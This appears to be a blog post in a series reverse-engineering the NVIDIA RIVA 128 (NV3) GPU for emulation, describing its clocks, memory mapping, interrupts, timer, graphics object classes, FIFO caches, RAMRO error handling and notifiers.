<p>This is how almost all modern game engines (Unity, Unreal, Godot…) represent 3D space. A very easy way to understand how a scene graph works is - I am not joking - install Roblox Studio, place some objects into the scene, save it as an <code>RBXLX</code> file (not the default), and open it in a text editor of your choice. You will see an XML representation of the scene you have created as a scene graph; the only caveat is that on Roblox, the cascading of characteristics from parent nodes to children is optional.</p>

<p>The scene graph is almost certainly the namesake for the functional block actually implementing the 2D and 3D drawing engine that makes the GPU, well, a GPU: <code>PGRAPH</code>. This part has survived from the very first NV1 all the way to the current Blackwell (RTX 5000) architecture; NVIDIA have never done a ground-up redesign since initial development of the NV1 architecture began in 1993, although the Ship of Theseus argument applies here.</p>

<h3 id="clocks">Clocks</h3>

<p>The RIVA 128 is not dependent on the host machine’s clock. It has a 13.5 or 14.3 MHz (depending on boot-time configuration) clock crystal, split by the hardware into a memory clock (MCLK) and video clock (VCLK). Note that these names are misleading; the MCLK also handles the chip’s actual rendering and timing, with the VCLK seemingly just handling the actual pushing out of frames.</p>

<p>The actual clocks are controlled by registers in <code>PRAMDAC</code> set by the video BIOS, which can later be overridden by drivers. In this iteration of the NVIDIA architecture, the VBIOS only performs a very basic POST sequence, initialises the card and sets its clock speed; once the chip is initialised, the VBIOS is effectively never needed again, although there are mechanisms to read from it after initialisation. Clocks were controlled by card manufacturers through parameters <code>m</code>/<code>n</code>/<code>p</code>, from which the chip derives the final memory and pixel clock speed with the formula <code>(frequency * n) / (m &lt;&lt; p)</code>. Generally, most manufacturers set the memory clock at around 100 MHz, and the pixel clock at around 40 MHz, although drivers seemingly reduce these clocks in some cases.</p>

<p>The chip’s RAMDAC handles final conversion of the digital image generated by the GPU into an analog video signal, and clock generation via three phase-locked loops. It has its own clock (ACLK) running at around 200 MHz on RIVA 128 (revision A/B) and 260 MHz on RIVA 128 ZX (revision C) chips, which unlike the other clocks, was not configurable by manufacturers.</p>

<h3 id="memory-mapping">Memory mapping</h3>

<p>Before we can discuss any part of how the RIVA 128 works, its memory architecture must be explained, since this is a fundamental requirement to even access the graphics card’s registers in the first place. NVIDIA picked a fairly strange memory mapping architecture, at least for cards of that time. The exact setup of the memory mapping changed numerous times as NVIDIA’s architecture evolved, so only NV3-based GPUs will be analyzed.</p>

<p>The memory mapping is split into three primary components, all exposed via memory-mapped I/O through Base Address Registers (BAR) in PCI configuration space; there is no port I/O support outside of the Weitek core’s registers for SVGA compatibility. The RIVA 128 uses two BARs, both 16 MB in size: BAR0 holding the main GPU registers, and BAR1 holding the <code>DFB</code> and <code>RAMIN</code> areas (which really refer to overlapping areas of memory).</p>

<h4 id="mmio">MMIO</h4>

<p>This is the primary memory mapping area, set up as Base Address Register 0 in the PCI configuration registers. This is how you speak to the GPU: 16 MB (!) of MMIO, mapped at a memory location defined by the system BIOS. Since the video BIOS has no access to PCI services, it instead uses I/O ports <code>0x3D0</code>-<code>0x3D3</code> in the Weitek SVGA core, mapped to a mechanism called RMA (Real Mode Access); a 32-bit address is formed by writing to all four RMA registers, then the next read/write to the VGA I/O region is redirected to the MMIO area, allowing the VBIOS to access it from real mode and initialise the GPU.</p>

<p>This MMIO area has numerous functional subsystems of the GPU mapped into it, with some overlap. The actual function of each graphics object will be described later.</p>

<h4 id="dfb">DFB</h4>

<p><code>DFB</code> is the aptly-named “Dumb Framebuffer”, a linear framebuffer set up as Base Address Register 1 on the NV3 (moved to BAR0 at <code>0x1000000</code> on later GPUs). The default size of 4 MB may change depending on VRAM size. This area is presumably meant for manipulating the GPU without using its DMA facilities.</p>

<h4 id="ramin">RAMIN</h4>

<p><code>RAMIN</code> is also located in BAR1. It’s a somewhat complicated area, but also the most important one to understand when it comes to the actual operation of the GPU, as it’s the part of video RAM where graphics objects and structures containing references to them are stored.</p>

<p>This area is effectively the last megabyte of VRAM (regardless of VRAM size), but organized as 16-byte blocks which are then stored from the top down. A <code>RAMIN</code> address can be converted to a real VRAM address with the formula <code>ramin_address ^ (vram_size - 16)</code>. I’m not entirely sure why they did this, but I assume it was for providing a more convenient interface to the user and for general efficiency reasons.</p>

<h3 id="interrupts">Interrupts</h3>

<p>A traditional interrupt system is implemented, supporting interrupts issued by different GPU components. <code>PMC</code> contains an interrupt status register and an interrupt enable register, with one bit for each component (including the eventually-removed <code>PAUDIO</code>), as well as a software interrupt represented by bit 31; components also have a local status register and enable register, with each bit representing an individual interrupt from that block. If the <code>PMC</code> interrupt status and enable bits for a given component are both 1, with some minor exceptions to be explained in later parts, an interrupt is declared to be pending and a PCI IRQ is sent.</p>

<p>Interrupts can be turned off globally (or just component interrupts, or just the software interrupt) via the <code>PMC_INTR_EN</code> register.</p>

<h3 id="programmable-interval-timer">Programmable interval timer</h3>

<p>Time-sensitive functions are provided by a relatively simple programmable interval timer <code>PTIMER</code> that fires an interrupt whenever the threshold value (set by the <code>PTIMER_ALARM</code>) is exceeded in nanoseconds. This is how the drivers internally keep track of many actions that they need to perform, and is the first functional block which must be done right if you ever hope to emulate the RIVA 128.</p>

<p>The least straightforward part of this timer is the counter itself, a 56-bit value split across two 32-bit registers: the lower 27 bits are stored in bits [31:5] of <code>PTIMER_TIME0</code>, and the upper 29 bits are stored in bits [28:0] of <code>PTIMER_TIME1</code>.</p>

<h3 id="graphics-commands-and-dma-engine">Graphics commands and DMA engine</h3>

<p>What may be called <em>graphics commands</em> in other GPU architectures are instead called <em>graphics objects</em> in the NV3 and all other NVIDIA architectures. Objects are submitted into the GPU core by writing into the <code>NV_USER</code> section of the MMIO BAR0 region through programmed I/O. Despite the fact that a custom memory access engine with its own translation lookaside buffer and other memory management structures was implemented for graphics object types that perform memory transfers, it does not seem to be used for graphics object submission until the NV4 architecture. Existing documentation is contradictory on whether or not this exists on the NV3, but drivers do not seem to use DMA to submit graphics objects; if a DMA submission method exists, it certainly works very differently to later versions of the architecture.</p>

<p>There are 8 DMA channels, with the default being channel 0 (also the only channel accessible through PIO?), but only one can be used at a time; using other channels requires a <em>context switch</em>, which entails writing the current channel ID to to <code>PGRAPH</code> registers for every class. All DMA channels use 64 KB of <code>RAMIN</code> memory (to be explained later), further divided into 8 KB (<code>0x2000</code>) subchannels, effectively representing one object; the meaning of what is in those subchannels depends on the type (or <em>class</em> to use NVIDIA terminology) of the object submitted into them, with the attributes of each object being called a <em>method</em>. A simple way to program the GPU is to just create subchannels for specific objects (such as one for text, one for rectangle, and so on) and change their data and methods as the program runs in order to create a graphical effect; however, this is a severely limited approach<sup id="fnref:nt" role="doc-noteref"><a href="#fn:nt" rel="footnote">12</a></sup>, and tapping the chip’s full potential requires the use of context switches between DMA channels, as well as the additional classes implemented in software by the drivers.</p>

<p>All objects have a <em>context</em>, consisting of a 32-bit “name” and another 32-bit value storing its class, associated channel and subchannel ID, where it is relative to the start of <code>RAMIN</code>, and whether it’s a software-injected or hardware graphical rendering object (bit 31). Contexts are stored in an area of RAM called <code>RAMFC</code> if the object’s channel is not being used; otherwise, they are stored in <code>RAMHT</code>, a <em>hash table</em> where the hash key is a single byte calculated by XORing each byte of the object’s name<sup id="fnref:htdriver" role="doc-noteref"><a href="#fn:htdriver" rel="footnote">13</a></sup> as well as the channel ID. Objects are stored in <code>RAMHT</code> as structures consisting of their 8-byte context followed by the <em>methods</em> mentioned earlier; an object’s byte offset in <code>RAMHT</code> is its hash multiplied by 16.</p>

<p>The exact set of methods of every graphics object in the architecture is incredibly long and often shared between several different types of objects (although the first 256 bytes and usually a few more after that are shared), and thus won’t be listed in part 1. An overall list of graphics objects can be found in the next section, but note that these are the ones defined by the hardware, while the drivers implement a much larger set of objects that do not map exactly to the ones in the GPU; furthermore, as you will see later, as each object is quite large at 8 KB, only one object does not mean only one (or even any at all - some are used to represent DMA objects, for example) graphics objects are drawn once the object is process. Objects can also be connected together with a special type of object called a “patchcord” constructed by the Resource Manager; the name is a remnant from the old NV1 quad patching days.</p>

<p>After being written to <code>NV_USER</code>, graphics objects are sent to one of two caches within the <code>PFIFO</code> subsystem: <code>CACHE0</code> which holds a single entry (really intended for the <a href="#interrupts-20-notifiers">notifier engine</a> to be able to inject graphics commands from software), or <code>CACHE1</code> which holds 32 entries on revisions A-B and 64 on revision C onwards. What these critical components actually do will be explored in full in later parts, but they effectively just store object names and contexts as they are waiting to be sent to <code>RAMIN</code>; a “pusher” pushes objects in from the bus as they are written into <code>NV_USER</code>, and a “puller” pulls them out of the bus and sends them where they need to be inside of the VRAM (or to <code>RAMRO</code> if they are invalid).</p>

<p>Once objects are pulled out, the GPU will simply manipulate the various registers in the <code>PGRAPH</code> subsystem in order to draw the object (if the object is actually rendered), and/or perform any DMA operations the graphics object may require using the DMA engine. Objects do not appear to “disappear” on frame refresh; instead, it would simply appear that they are simply drawn over, and most likely, any renderer will simply clear the entire screen (with a <em>Rectangle</em> object for instance) before resubmitting any graphics objects they need to render.</p>

<p>Both <code>RAMFC</code> and <code>RAMHT</code> can have their sizes, and to some extent their location within RAMIN, configured by registers within the <code>PFIFO</code> block. <code>RAMHT</code> can be 4 KB (of questionable usefulness as that cannot fill <code>CACHE1</code>), 8 KB, 16 KB, or 32 KB in size, while RAMFC is either 512 bytes or 8 KB.</p>

<h4 id="object-list">Object list</h4>

<p>Any class values not listed here are invalid; in theory, the 5-bit value in the object context allows for 32 classes, but NVIDIA did not implement the full amount, and moved to a different approach (where the classes are somewhat more constructed in software) with the NV4 architecture.</p>

<p><strong><code>0x01</code> (Beta factor):</strong> The beta factor used for blending operations. (combining an output pixel with another pixel to produce a final image)</p>

<p><strong><code>0x02</code> (ROP5 operation):</strong> The Render OPeration used for blending. (e.g. XOR)</p>

<p><strong><code>0x03</code> (Chroma Key):</strong> Similar to a color key used in video editing.</p>

<p><strong><code>0x04</code> (Plane mask):</strong> Seems to be implemented similarly to <em>Chroma Key</em>, not sure what it has to do with planes. (bitplane? 2D plane?)</p>

<p><strong><code>0x05</code> (Clipping rectangle):</strong> A rectangle used for enabling/disabling render operations within a specific region.</p>

<p><strong><code>0x06</code> (Pattern):</strong> Pattern used for bitblit and other blits.</p>

<p><strong><code>0x07</code> (Rectangle):</strong> Up to 16 rectangles with size and position represented as a 32-bit value. (low 16 bits are X, high 16 bits are Y)</p>

<p><strong><code>0x08</code> (Point):</strong> An arbitrary point on the screen. Depending on the methods used to submit the object, this object can take the form of:</p>

<ul>
  <li>Up to 32 points, each with a single arbitrary 32-bit colour (probably BGRA format) and 16-bit size and position values;</li>
  <li>Up to 16 points, each with a single arbitrary 32-bit colour (probably BGRA format) and 32-bit size and position values;</li>
  <li>Up to 16 points, making up a polygon, with an arbitrary 32-bit colour for each polygon line (probably BGRA format) and 16-bit size and position values.</li>
</ul>

<p><strong><code>0x09</code> (Line):</strong> An arbitrary line on the screen. Depending on the methods used to submit the object, this object can take the form of:</p>

<ul>
  <li>Up to 16 lines, each with a single arbitrary 32-bit colour (probably BGRA format) and 16-bit size and position values;</li>
  <li>Up to 8 lines, each with a single arbitrary 32-bit colour (probably BGRA format) and 32-bit size and position values;</li>
  <li>Up to 32 lines, each making up a polygon, with a single arbitrary 32-bit colour (probably BGRA format) and 16-bit size and position values;</li>
  <li>Up to 16 lines, each making up a polygon, with a single arbitrary 32-bit colour (probably BGRA format) and 32-bit size and position values;</li>
  <li>Up to 16 lines, each making up a polygon, with an arbitrary 32-bit colour for each polygon line (probably BGRA format) and 16-bit size and position values.</li>
</ul>

<p><strong><code>0x0A</code> (Lin):</strong> Same as <em>Line</em>, but the starting and ending pixels are not drawn for each line.</p>

<p><strong><code>0x0B</code> (Triangle):</strong> A basic (presumably pre-transformed?) 2D triangle. Depending on the methods used to submit the object, this object can take the form of:</p>

<ul>
  <li>A single triangle with a single arbitrary 32-bit colour and three 16-bit position values for each of the triangle’s vertexes;</li>
  <li>A single triangle with a single arbitrary 32-bit colour for the entire mesh, and three 16-bit position values for each of the triangle’s vertexes;</li>
  <li>A part of a mesh of up to 32 triangles with a single arbitrary 32-bit colour and two 16-bit position values for each of the points on the mesh;</li>
  <li>A part of a mesh of up to 16 triangles with a single arbitrary 32-bit colour and two 32-bit position values for each of the points on the mesh;</li>
  <li>A set of up to 8 triangles with a single arbitrary 32-bit colour for the entire mesh, and three 16-bit position values for each of the triangle’s vertexes;</li>
  <li>A part of a mesh of up to 16 triangles with a 32-bit colour and two 32-bit position values for each of the points on the mesh.</li>
</ul>

<p><strong><code>0x0C</code> (Windows 95 GDI Text Acceleration):</strong> A specialized hardware accelerator for the manner by which Windows 95’s GDI (and its DIB Engine?) renders text. This is a very complicated set of clipping logic that won’t be covered until Part 3; it’s too long for this part, and I don’t fully understand it yet.</p>

<p><strong><code>0x0D</code> (Memory to memory format):</strong> Changes the format of a set of pixels in VRAM. Allows for changing the line (vertical size) length, count and pitch of the image.</p>

<p><strong><code>0x0E</code> (Scaled image from memory):</strong> Obtains an image from VRAM (in YUV or RGB format) and scales it before displaying it to the screen, performing a bit of differentiation to achieve this. Parameters an output position and size for the final screen as well as an input position or size.</p>

<p><strong><code>0x10</code> (Blit):</strong> Blits an image (a final one made up of 3D polygons or a 2D one) between two different parts of the screen. Has an input and output position and a size.</p>

<p><strong><code>0x11</code> (Image from CPU):</strong> Takes an image from “CPU” (main memory?), optionally scales it, and then displays it on the screen. Parameters are an input size, set of 32-bit colour values and output position and size.</p>

<p><strong><code>0x12</code> (Bitmap):</strong> Similar to <em>Image from CPU</em>, but deals with monochrome or two-colour bitmaps instead, possibly as an optimisation.</p>

<p><strong><code>0x14</code> (Transfer to Memory):</strong> Takes an image from the screen (?) and transfers it to memory. Parameters are a start position offset from VRAM and a pitch, as well as a position and size for the image.</p>

<p><strong><code>0x15</code> (Stretched image from CPU):</strong> Takes an image from “CPU” (main memory?), stretches it using an optional clip region and a little bit of differentiation, and then uses it. Parameters are an input size and a clip region using the same 16-bit coordinate format used by the basic primitive drawing silicon.</p>

<p><strong><code>0x17</code> (Direct3D 5.0 accelerated triangle with zeta buffer):</strong> Seemingly an attempt to implement the Direct3D 5.0 specification to the letter in silicon. Allows for up to 128 triangles to be submitted at a time, with six coordinates:</p>

<ul>
  <li>The traditional X, Y and Z coordinates used for representing vector values in 3D space</li>
  <li>U and V coordinates for textures. Textures may be <em>uploaded</em> at sizes up to 2048x2048 (only power of two textures are allowed!), but are scaled down to 256x256 during upload, if they are larger.</li>
  <li>An “M” coordinate, apparently a “measurement dimension” used for more precise measurement of real-world distances</li>
</ul>

<p>Each triangle may have a 32-bit colour value as well. Note that the RIVA 128 is not a multitexture-capable GPU; you can only apply one texture to each batch of 128 triangles, so the implementation of Direct3D in the drivers should attempt to send as many triangles with the same texture to the GPU as the GPU can fit, as closely as possible. If you write applications targeting this GPU, you should try ensuring objects with the same texture add up to close to a multiple of 128 triangles, as the D3D driver’s implementation of this optimisation will improve the efficiency of your renderer.</p>

<p>These triangles, as a group, may have the following effects applied to them:</p>
<ul>
  <li>“Zeta buffer” (may be similar to the Z-buffer used for polygon ordering, or for mipmapping?)</li>
  <li>“Alpha buffer” (probably for alpha blending)</li>
  <li>Specular highlighting</li>
  <li>Vertex fog (of any 32-bit colour)</li>
  <li>Interpolation between vertex positions (using a zero-order hold, “Microsoft” variant of zero-order hold, or full-order hold implementation)</li>
  <li>Frustum culling clockwise or counterclockwise (discarding triangles, although presumably this would only work in the batch of 128 triangles sent to the hardware for processing)</li>
  <li>Texture UV coordinate wrapping for seamless textures (coordinates can wrap cleanly, be clamped to their “last” pixels or mirror themselves)</li>
</ul>

<p><strong><code>0x18</code> (Point with zeta buffer):</strong> Similar to <em>Point</em>, but the zeta and alpha buffer can be applied to it too.</p>

<h4 id="when-you-screw-up-ramro">When you screw up: RAMRO</h4>

<p>Aside from the previously-covered <code>RAMFC</code> and <code>RAMAU</code>, another important structure is stored in <code>RAMIN</code>. <code>RAMRO</code> saves the day and prevents the GPU from blowing up if a graphics object you submit is invalid, because after all, nothing is perfect and there are always bugs in code.</p>

<p>During object submission, if the GPU detects that the cache ran out, was turned off, or any kind of illegal access was performed, the submission is not processed; instead, it is sent to a special area of <code>RAMIN</code> known as <code>RAMRO</code> (always half the size of <code>RAMHT</code>), which stores the object, what went wrong, and whether a read or write operation was involved in the error. Additionally, an interrupt is fired so that any drivers running on the system can catch the error and (hopefully) correct it.</p>

<p>The <code>PFIFO_RUNOUT_STATUS</code> register holds the current state of the <code>RAMRO</code> region, including whether or not any errors have occurred.</p>

<h4 id="ramau">RAMAU</h4>

<p><code>RAMAU</code> was an area used on the NV1 and revision A NV3 chips for storing audio data being streamed into the CPU. On Revision B and later cards, this area is still mapped to MMIO space, but its functionality has been removed entirely.</p>

<h3 id="interrupts-20-notifiers">Interrupts 2.0: Notifiers</h3>

<p>Some people at NVIDIA decided that they were too cool for interrupts and thought: why have an interrupt that tells the GPU to do something, when you could have an interrupt that has the GPU tell the drivers to do something? And thus the incredible <em>notifier</em> system was born.</p>

<p>Notifiers appear to have been implemented to allow the drivers to manage GPU resources implemented in software instead of silicon. Every single subsystem in the GPU has a notifier enable register alongside its interrupt enable register, with some having multiple enable registers for different notifier types; notifiers are mostly found within <code>PGRAPH</code>, <code>PME</code> and <code>PVIDEO</code>, but may also exist in other subsystems.</p>

<p><code>PGRAPH</code> notifiers appear to be intended to work with the object class system, and actually differ - there is basically one “type” of notification depending on the object class, with each object having a set of “notification parameters” that can be used to trigger the <code>SetNotify</code> method at <code>0x104</code> within an object stored in <code>RAMHT</code>. There is also the <code>SetNotifyCtxDma</code> method, usually but not always at <code>0x0</code>, which is used for context switching. Notifiers appear to be “requested” until the GPU processes them, and <code>PGRAPH</code> can take up to 16 software and 1 hardware notifier type. Objects are signalled to the driver by directly DMAing into the Resource Manager memory. Notifications are represented by a structure as such:</p>

<div><pre><code><span>typedef</span> <span>struct</span> <span>{</span>
    <span>struct</span> <span>{</span>
        <span>uint32_t</span> <span>nanoseconds</span><span>[</span><span>2</span><span>];</span>
    <span>}</span> <span>TimeStamp</span><span>;</span>
    <span>int32_t</span> <span>info32</span><span>;</span>
    <span>int16_t</span> <span>info16</span><span>;</span>
    <span>int16_t</span> <span>status</span><span>;</span> <span>/* 0xFF (NV_NOTIFICATION_IN_PROGRESS) = pending; 0x00 = complete; others = error */</span>
<span>}</span> <span>NvNotification</span><span>;</span>
</code></pre></div>

<p>More research is ongoing. It appears that most notifiers are generated by the driver in order to manage hardware resources that they would not otherwise be capable of managing, such as the <code>PFIFO</code> caches.</p>

<h3 id="pramdac">PRAMDAC</h3>

<p>The final part of the GPU that handles the intricacies of generating a video signal, sets the resolution, and holds a color lookup table for the various modes.</p>

<p>I haven’t looked into this part as much, so expect more information in an update on this part or in future parts of this series. It’s not really super critical to emulate anyway, outside of the <a href="#clocks">clock control portion</a>, as the actual analog video generation part mostly does not apply to emulation.</p>

<hr>

<h2 id="next-part">Next part</h2>

<p>The next part will dive into how NVIDIA’s drivers work and how they make this ridiculously complicated mess of an architecture transform itself into a GPU that allows you to run games you may actually want to play. Stay tuned!</p>
